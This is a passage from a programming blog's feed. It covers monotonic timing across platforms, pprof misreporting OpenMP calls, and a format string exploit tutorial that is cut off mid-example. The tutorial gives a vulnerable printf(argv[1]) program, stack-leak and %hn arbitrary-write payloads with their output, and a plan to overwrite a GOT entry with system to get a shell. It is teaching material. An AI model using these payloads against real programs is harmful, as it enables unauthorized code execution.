&lt;span class="n"&gt;gettimeofday&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;before&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="n"&gt;function&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="n"&gt;gettimeofday&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;after&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Unfortunately, this will not always work since it is dependent on the system clock. If some other process changes the system time between the two calls to &lt;code&gt;gettimeofday&lt;/code&gt;, it could report inaccurate results. We need a function that returns a monotonically increasing value.&lt;/p&gt;
&lt;h1&gt;A solution?&lt;/h1&gt;
&lt;p&gt;Luckily, such a function exists on Linux. We can use &lt;code&gt;clock_gettime&lt;/code&gt; with &lt;code&gt;CLOCK_MONOTONIC&lt;/code&gt;:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;timespec&lt;/span&gt; &lt;span class="n"&gt;before&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;after&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;total&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="n"&gt;clock_gettime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CLOCK_MONOTONIC&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;before&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="n"&gt;function&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="n"&gt;clock_gettime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CLOCK_MONOTONIC&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;after&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Other platforms&lt;/h1&gt;
&lt;p&gt;Unfortunately, this doesn't work everywhere! Each platform has its own way
accessing a high resolution monotonic counter. On Mac OS X we use
&lt;a href="https://developer.apple.com/library/mac/#qa/qa1398/_index.html"&gt;&lt;code&gt;mach_absolute_time&lt;/code&gt;&lt;/a&gt;
and on Windows we use
&lt;a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms644904(v=vs.85).aspx"&gt;&lt;code&gt;QueryPerformanceCounter&lt;/code&gt;&lt;/a&gt;. &lt;/p&gt;
&lt;h2&gt;&lt;code&gt;rdtsc&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;On x86 machines where none of these are available, we can resort directly to &lt;code&gt;rdtsc&lt;/code&gt;. This is a special instruction that returns the &lt;a href="https://en.wikipedia.org/wiki/Time_Stamp_Counter"&gt;Time Stamp Counter&lt;/a&gt;, the number of cycles since reset. Unfortunately, we have to be &lt;em&gt;very&lt;/em&gt; careful when using this instruction. &lt;a href="http://download.intel.com/embedded/software/IA/324264.pdf"&gt;This white paper&lt;/a&gt; offers a lot of good advice on how to use it, but in short we have to take care to prevent instruction reordering. In the following code, the reordering of the &lt;code&gt;fdiv&lt;/code&gt; after the &lt;code&gt;rdtsc&lt;/code&gt; would lead to inaccurate timing results:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="nf"&gt;rdtsc&lt;/span&gt;
&lt;span class="nf"&gt;fdiv&lt;/span&gt; &lt;span class="c"&gt;# Or another slow instruction&lt;/span&gt;
&lt;span class="nf"&gt;rdtsc&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The instruction &lt;code&gt;rdtscp&lt;/code&gt; prevents instructions that occur before the &lt;code&gt;rdtsc&lt;/code&gt; from being reordered afterwards. Unfortunately, instructions that occur after the &lt;code&gt;rdtscp&lt;/code&gt; can still be reordered before it. The following code could have &lt;code&gt;fdiv&lt;/code&gt; reordered before the &lt;code&gt;rdtscp&lt;/code&gt;, leading to inaccurate results:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="nf"&gt;rdtscp&lt;/span&gt;
&lt;span class="nf"&gt;call&lt;/span&gt; &lt;span class="no"&gt;function&lt;/span&gt;
&lt;span class="nf"&gt;rdtscp&lt;/span&gt;
&lt;span class="nf"&gt;fdiv&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The suggested way to avoid the reordering is to use the &lt;code&gt;cpuid&lt;/code&gt; instruction, which has the effect of preventing all instruction reordering around it. While this is a slow instruction, we can be a bit clever and ensure that we never have to execute it while between the times when we query the counter.&lt;br /&gt;
The ideal timing code looks something like this:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="nf"&gt;cpuid&lt;/span&gt;
&lt;span class="nf"&gt;rtdsc&lt;/span&gt;
&lt;span class="c"&gt;# Save %edx and %eax (the output of rtdsc).&lt;/span&gt;
&lt;span class="nf"&gt;call&lt;/span&gt; &lt;span class="no"&gt;function&lt;/span&gt;
&lt;span class="nf"&gt;rdtscp&lt;/span&gt;
&lt;span class="c"&gt;# Save %edx and %eax.&lt;/span&gt;
&lt;span class="nf"&gt;cpuid&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;A cross platform timer&lt;/h1&gt;
&lt;p&gt;Assembling all this information, I attempted to write a cross-platform utility for fine grained timing. A few late nights and a file full of &lt;code&gt;#ifdef&lt;/code&gt;s later, I have the start of such a utility. Currently, it supports the function &lt;code&gt;monotonic_seconds&lt;/code&gt; which returns the seconds from some unspecified start point as a double precision floating point number. In the future, I'll add support for &lt;code&gt;monotonic_cycles&lt;/code&gt; as a static inline function in the header and &lt;code&gt;cycles_to_seconds&lt;/code&gt; as a way to convert cycles to seconds. Check it out &lt;a href="https://github.com/awreece/monotonic_timer/blob/master/monotonic_timer.c"&gt;here&lt;/a&gt;!&lt;/p&gt;</summary><category term="profiling"></category></entry><entry><title>Why is omp_get_num_procs so slow?</title><link href="http://codearcana.com/posts/2013/05/10/why-is-omp_get_num_procs-so-slow.html" rel="alternate"></link><updated>2013-05-10T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-05-10:posts/2013/05/10/why-is-omp_get_num_procs-so-slow.html</id><summary type="html">&lt;p&gt;I was advising some students in
&lt;a href="http://15418.courses.cs.cmu.edu/15418_spr13/"&gt;15-418&lt;/a&gt;, a parallel computer
architecture and programming course at CMU. They were attempting to make a
multithreaded puzzle solver using OpenMP and had some difficulty using the CPU
profiler from &lt;a href="https://code.google.com/p/gperftools/"&gt;Google &lt;code&gt;perftools&lt;/code&gt;&lt;/a&gt;.
Basically, the profiler kept reporting that &lt;code&gt;omp_get_num_procs&lt;/code&gt; was taking a
huge portion of the program:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt;  pprof --text solver out.prof 
&lt;span class="go"&gt;Using local file solver.&lt;/span&gt;
&lt;span class="go"&gt;Using local file out.prof.&lt;/span&gt;
&lt;span class="go"&gt;Removing _L_unlock_16 from all stack traces.&lt;/span&gt;
&lt;span class="go"&gt;Total: 1382 samples&lt;/span&gt;
&lt;span class="go"&gt;     633  45.8%  45.8%      633  45.8% omp_get_num_procs&lt;/span&gt;
&lt;span class="go"&gt;     283  20.5%  66.3%      283  20.5% is_complete_row&lt;/span&gt;
&lt;span class="go"&gt;     226  16.4%  82.6%      226  16.4% partial_check_col&lt;/span&gt;
&lt;span class="go"&gt;     102   7.4%  90.0%      744  53.8% backtrack_row_solve&lt;/span&gt;
&lt;span class="go"&gt;      42   3.0%  93.1%       85   6.2% partial_check_row&lt;/span&gt;
&lt;span class="go"&gt;      41   3.0%  96.0%      351  25.4% partial_check&lt;/span&gt;
&lt;span class="go"&gt;      26   1.9%  97.9%      292  21.1% complete_and_check_puzzle&lt;/span&gt;
&lt;span class="go"&gt;      25   1.8%  99.7%       25   1.8% is_complete_col&lt;/span&gt;
&lt;span class="go"&gt;       3   0.2%  99.9%      749  54.2% _Z28backtrack_row_solve_paralleliiiPiPS_S0_._omp_fn.0&lt;/span&gt;
&lt;span class="go"&gt;       1   0.1% 100.0%     1328  96.1% GOMP_taskwait&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%        1   0.1% GOMP_loop_dynamic_start&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%     1258  91.0% __clone&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%      124   9.0% __libc_start_main&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%      124   9.0% _start&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%      124   9.0% backtrack_row_solve_parallel&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%      124   9.0% backtrack_solve&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%      124   9.0% main&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%      124   9.0% solve&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%     1258  91.0% start_thread&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This was clearly not right, so I spent some time digging around. If we look at 
the callgraph to find which functions call &lt;code&gt;omp_get_num_procs&lt;/code&gt;, we see that the 
culprit is &lt;code&gt;GOMP_taskwait&lt;/code&gt;: &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; pprof --gv --focus&lt;span class="o"&gt;=&lt;/span&gt;omp_get_num_procs solver out.prof
&lt;/pre&gt;&lt;/div&gt;


&lt;!-- TODO(awreece) Use the images support with newer pelican. --&gt;

&lt;p&gt;&lt;img alt="omp_get_num_procs call graph" src="http://codearcana.com/images/omp_get_num_procs.png" title="omp_get_num_procs call graph" /&gt;&lt;/p&gt;
&lt;p&gt;We cannot view annotated source for this function (since we don't have source),
but we &lt;em&gt;can&lt;/em&gt; look at the annotated disassembly. &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; pprof --disas&lt;span class="o"&gt;=&lt;/span&gt;GOMP_taskwait solver out.prof 
&lt;span class="go"&gt;ROUTINE ====================== GOMP_taskwait&lt;/span&gt;
&lt;span class="go"&gt;     1   1330 samples (flat, cumulative) 96.2% of total&lt;/span&gt;
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;     .     16        84ef: callq  9ca0 &amp;lt;omp_get_num_procs+0x540&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     .      .        84f4: nopl   0x0(%rax)&lt;/span&gt;
&lt;span class="go"&gt;     .      .        84f8: mov    %fs:0x10(%rbx),%r13&lt;/span&gt;
&lt;span class="go"&gt;     .      .        84fd: mov    %r12,%rdi&lt;/span&gt;
&lt;span class="go"&gt;     .    695        8500: callq  *%rbp&lt;/span&gt;
&lt;span class="go"&gt;     .      .        8502: lea    0x80(%r13),%rdi&lt;/span&gt;
&lt;span class="go"&gt;     .    391        8509: callq  9b40 &amp;lt;omp_get_num_procs+0x3e0&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     .      .        850e: mov    %r14,%rdi&lt;/span&gt;
&lt;span class="go"&gt;     .    156        8511: callq  9ca0 &amp;lt;omp_get_num_procs+0x540&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Aha! The functions are being poorly identified, so it appears that &lt;em&gt;all&lt;/em&gt; calls to OpenMP library functions are being understood as calls to &lt;code&gt;omp_get_num_procs&lt;/code&gt;. Unfortunately, there is nothing we can do about it - that library does not export any symbols:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ldd solver | grep gomp
&lt;span class="go"&gt;    libgomp.so.1 =&amp;gt; /usr/lib64/libgomp.so.1 (0x00007f19e9109000)&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; nm /usr/lib64/libgomp.so.1
&lt;span class="go"&gt;nm: /usr/lib64/libgomp.so.1: no symbols&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;At least now why &lt;code&gt;omp_get_num_threads&lt;/code&gt; is reported so much! We probably need to count all calls to &lt;code&gt;omp_get_num_threads&lt;/code&gt; as 'overhead from OpenMP' but otherwise not trust the specific counts.
In my opinion, the profiler should emit function addresses 
for functions that don't map to some symbol, but I understand that is hard. For now, we will get more meaningful profiling data about our code if we do:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; pprof --text --ignore&lt;span class="o"&gt;=&lt;/span&gt;omp_get_num_procs solver out.prof 
&lt;span class="go"&gt;Using local file solver.&lt;/span&gt;
&lt;span class="go"&gt;Using local file out.prof.&lt;/span&gt;
&lt;span class="go"&gt;Removing _L_unlock_16 from all stack traces.&lt;/span&gt;
&lt;span class="go"&gt;Total: 1382 samples&lt;/span&gt;
&lt;span class="go"&gt;     283  37.8%  37.8%      283  37.8% is_complete_row&lt;/span&gt;
&lt;span class="go"&gt;     226  30.2%  68.0%      226  30.2% partial_check_col&lt;/span&gt;
&lt;span class="go"&gt;     102  13.6%  81.6%      744  99.3% backtrack_row_solve&lt;/span&gt;
&lt;span class="go"&gt;      42   5.6%  87.2%       85  11.3% partial_check_row&lt;/span&gt;
&lt;span class="go"&gt;      41   5.5%  92.7%      351  46.9% partial_check&lt;/span&gt;
&lt;span class="go"&gt;      26   3.5%  96.1%      292  39.0% complete_and_check_puzzle&lt;/span&gt;
&lt;span class="go"&gt;      25   3.3%  99.5%       25   3.3% is_complete_col&lt;/span&gt;
&lt;span class="go"&gt;       3   0.4%  99.9%      748  99.9% _Z28backtrack_row_solve_paralleliiiPiPS_S0_._omp_fn.0&lt;/span&gt;
&lt;span class="go"&gt;       1   0.1% 100.0%      695  92.8% GOMP_taskwait&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%      694  92.7% __clone&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%       55   7.3% __libc_start_main&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%       55   7.3% _start&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%       55   7.3% backtrack_row_solve_parallel&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%       55   7.3% backtrack_solve&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%       55   7.3% main&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%       55   7.3% solve&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%      694  92.7% start_thread  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</summary><category term="profiling"></category></entry><entry><title>Introduction to Format String Exploits</title><link href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html" rel="alternate"></link><updated>2013-05-02T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-05-02:posts/2013/05/02/introduction-to-format-string-exploits.html</id><summary type="html">&lt;h1&gt;How do format strings vulnerabilities work?&lt;/h1&gt;
&lt;p&gt;Format string vulnerabilities are a pretty silly class of bug that take advantage of an easily avoidable programmer error.
If the programmer passes an attacker-controlled buffer as the argument to a &lt;code&gt;printf&lt;/code&gt; 
(or any of the related functions, including &lt;code&gt;sprintf&lt;/code&gt;, &lt;code&gt;fprintf&lt;/code&gt;, etc), the attacker can perform
writes to arbitrary memory addresses. The following program contains such an error:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include&amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="n"&gt;strncpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Since &lt;code&gt;printf&lt;/code&gt; has a variable number of arguments, it must use the format string to determine the number of arguments.
In the case above, the attacker can pass the string &lt;code&gt;"%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p"&lt;/code&gt; and fool the &lt;code&gt;printf&lt;/code&gt; into thinking it has 15
arguments. It will naively print the next 15 addresses on the stack, thinking they are its arguments:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./a.out &lt;span class="s2"&gt;&amp;quot;%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;0xffffdddd 0x64 0xf7ec1289 0xffffdbdf 0xffffdbde (nil) 0xffffdcc4 0xffffdc64 (nil) 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;At about 10 arguments up the stack, we can see a repeating pattern of &lt;code&gt;0x252070&lt;/code&gt; - those are our &lt;code&gt;%p&lt;/code&gt;s on the stack! We start our string
with &lt;code&gt;AAAA&lt;/code&gt; to see this more explicitly:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./a.out &lt;span class="s2"&gt;&amp;quot;AAAA%p %p %p %p %p %p %p %p %p %p&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;AAAA0xffffdde8 0x64 0xf7ec1289 0xffffdbef 0xffffdbee (nil) 0xffffdcd4 0xffffdc74 (nil) 0x41414141&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The &lt;code&gt;0x41414141&lt;/code&gt; is the hex representation of &lt;code&gt;AAAA&lt;/code&gt;. We now have a way to pass an
arbitrary value (in this case, we're passing &lt;code&gt;0x41414141&lt;/code&gt;) as an argument to &lt;code&gt;printf&lt;/code&gt;. At this point we will take
advantage of another format string feature: in a format specifier, we can also select a specific argument. For example,
&lt;code&gt;printf("%2$x", 1, 2, 3)&lt;/code&gt; will print 2. In general, we can do &lt;code&gt;printf("%&amp;lt;some number&amp;gt;$x")&lt;/code&gt; to select an arbitrary argument
to &lt;code&gt;printf&lt;/code&gt;. In our case, we see that &lt;code&gt;0x41414141&lt;/code&gt; is the 10th argument to &lt;code&gt;printf&lt;/code&gt;, so we can simplify our string&lt;sup id="fnref:1"&gt;&lt;a class="footnote-ref" href="#fn:1" rel="footnote"&gt;1&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./a.out &lt;span class="s1"&gt;&amp;#39;AAAA%10$p&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;AAAA0x41414141&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So how do we turn this into an arbitrary write primitive? Well, &lt;code&gt;printf&lt;/code&gt; has a &lt;em&gt;really interesting&lt;/em&gt; format specifier: &lt;code&gt;%n&lt;/code&gt;.
From the man page of &lt;code&gt;printf&lt;/code&gt;: &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The number of characters written so far is stored into the  integer indicated  by the int * (or variant) pointer argument.  No argument is converted.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;If we were to pass the string &lt;code&gt;AAAA%10$n&lt;/code&gt;, we would write the value 4 to the address &lt;code&gt;0x41414141&lt;/code&gt;! We can use another 
&lt;code&gt;printf&lt;/code&gt; feature to write larger values: if we do &lt;code&gt;printf("AAAA%100x")&lt;/code&gt;, 104 characters will be output 
(because &lt;code&gt;%100x&lt;/code&gt; prints the argument padded to at least 100 characters). We can do &lt;code&gt;AAAA%&amp;lt;value-4&amp;gt;x%10$n&lt;/code&gt; to write an
arbitrary value to &lt;code&gt;0x41414141&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The next thing to know is that almost certainly don't want to write all characters in one go: for example, 
if we want to write the value &lt;code&gt;0x0804a004&lt;/code&gt;, we would have to write 134520836 characters to standard out! Instead,
we break it up into two writes: first we write &lt;code&gt;0x0804&lt;/code&gt; (2052) to the higher two bytes of the target address and then we 
write &lt;code&gt;0xa004&lt;/code&gt; (40964) to the lower two bytes of the target address. To do this, we will use &lt;code&gt;%hn&lt;/code&gt; to write only 2 bytes
at a time. Such a format string might look like this: &lt;code&gt;CAAAAAAA%2044x%10$hn%38912x%11$hn&lt;/code&gt;. Lets break this down so we can
understand it.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;CAAAAAAA&lt;/code&gt; - this is the higher two bytes of the target address (&lt;code&gt;0x41414143&lt;/code&gt;) 
      and the lower two bytes of the target address (&lt;code&gt;0x41414141&lt;/code&gt;) &lt;/li&gt;
&lt;li&gt;&lt;code&gt;%2044x%10$hn&lt;/code&gt; - since we want to have written a total of 2052 bytes when we get to the 
      first &lt;code&gt;%hn&lt;/code&gt;, and we have already written 8 bytes so far, we need to write an addition
      2044 bytes.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%38912x%11$hn&lt;/code&gt; - since we want to have written a total of 40964 bytes when we get to the
      second &lt;code&gt;%hn&lt;/code&gt;, and we since we have already written 2052 bytes so far, we need to write
      an additional 38912 bytes.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Here is an example of how this might be used &lt;sup id="fnref:2"&gt;&lt;a class="footnote-ref" href="#fn:2" rel="footnote"&gt;2&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="go"&gt;./a.out &amp;quot;$(python -c &amp;#39;import sys; sys.stdout.write(&amp;quot;CAAAAAAA%2044x%10$hn%38912x%11$hn&amp;quot;)&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;What can we do with them?&lt;/h1&gt;
&lt;p&gt;Since a format string vulnerability gives us the ability to write an arbitrary value 
to an arbitrary address, we can do a lot of things with it. Usually the easiest thing to do is
write to a function pointer somewhere and turn our arbitrary write primitive 
into arbitrary code execution. In dynamically linked programs, these are easy to find.
When a program attempts to execute a function in a shared library, it does not necessarily
know the location of that function at compile time. Instead, it jumps to a stub function that has a pointer
to the correct location of the function in the shared library. This pointer (located in the global offset table, or GOT)
is initialized at runtime when the stub function is first called. &lt;/p&gt;
&lt;p&gt;For example, when &lt;code&gt;strcat&lt;/code&gt; is used in a program, the
following piece of stub code allows the program to find the correct location in the shared library &lt;code&gt;libc&lt;/code&gt; at run time:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; objdump -d a.out
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;08048330 &amp;lt;strcat@plt&amp;gt;:&lt;/span&gt;
&lt;span class="go"&gt; 8048330:       ff 25 04 a0 04 08       jmp    *0x804a004&lt;/span&gt;
&lt;span class="go"&gt; 8048336:       68 08 00 00 00          push   $0x8&lt;/span&gt;
&lt;span class="go"&gt; 804833b:       e9 d0 ff ff ff          jmp    8048310 &amp;lt;_init+0x3c&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Here you can see that the &lt;code&gt;stcat@plt&lt;/code&gt; is the stub function that jumps to GOT entry for &lt;code&gt;strcat&lt;/code&gt; (the address &lt;code&gt;0x804a004&lt;/code&gt;),
which is set at runtime to the location in &lt;code&gt;libc&lt;/code&gt; of the &lt;code&gt;strcat&lt;/code&gt; function. We can write any value we want
to &lt;code&gt;0x804a004&lt;/code&gt;. When &lt;code&gt;strcat&lt;/code&gt; is used later in the program, the program will instead transfer code execution
to the value we specified. A common technique is to overwrite the GOT entry with the address of the function &lt;code&gt;system&lt;/code&gt;, 
thereby turning a call of &lt;code&gt;strcat(buffer, "hello")&lt;/code&gt; into the call &lt;code&gt;system(buffer)&lt;/code&gt; (if we can control the contents 
of &lt;code&gt;buffer&lt;/code&gt;, we can get a shell!).&lt;/p&gt;
&lt;h1&gt;An example&lt;/h1&gt;
&lt;p&gt;For an example, we will exploit the following C program:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span class="c1"&gt;// compile with gcc -m32 temp.c&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
  &lt;span class="n"&gt;strdup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Over plan is going to be to overwrite the GOT entry of &lt;code&gt;strdup&lt;/code&gt; with the address of &lt;code&gt;system&lt;/code&gt;, so the program
will &lt;code&gt;printf(argv[1])&lt;/code&gt; then &lt;code&gt;system(argv[1])&lt;/code&gt;. Hence, our payload must be a valid argument to &lt;code&gt;system&lt;/code&gt; - we will
start our payload with &lt;code&gt;sh;#&lt;/code&gt; (which will be &lt;code&gt;sh&lt;/code&gt; and cause the rest of the payload to be a comment. 
This also has the advantage of being exactly 4 bytes long, which isn't important for this example 
but is very useful in other cases). &lt;/p&gt;
&lt;p&gt;For every format string exploit, our payload will eventually 
look something like this: &lt;code&gt;&amp;lt;address&amp;gt;&amp;lt;address+2&amp;gt;%&amp;lt;number&amp;gt;x%&amp;lt;offset&amp;gt;$hn%&amp;lt;other number&amp;gt;x%&amp;lt;offset+1&amp;gt;$hn&lt;/code&gt;. 
We prepare a payload that will be the same length as our final payload so we can start computing
the correct offsets and addresses (note that we use &lt;code&gt;%hp&lt;/code&gt; and &lt;code&gt;%00000x&lt;/code&gt; so we can just modify the string
in the last step without modifying its length):&lt;/p&gt;
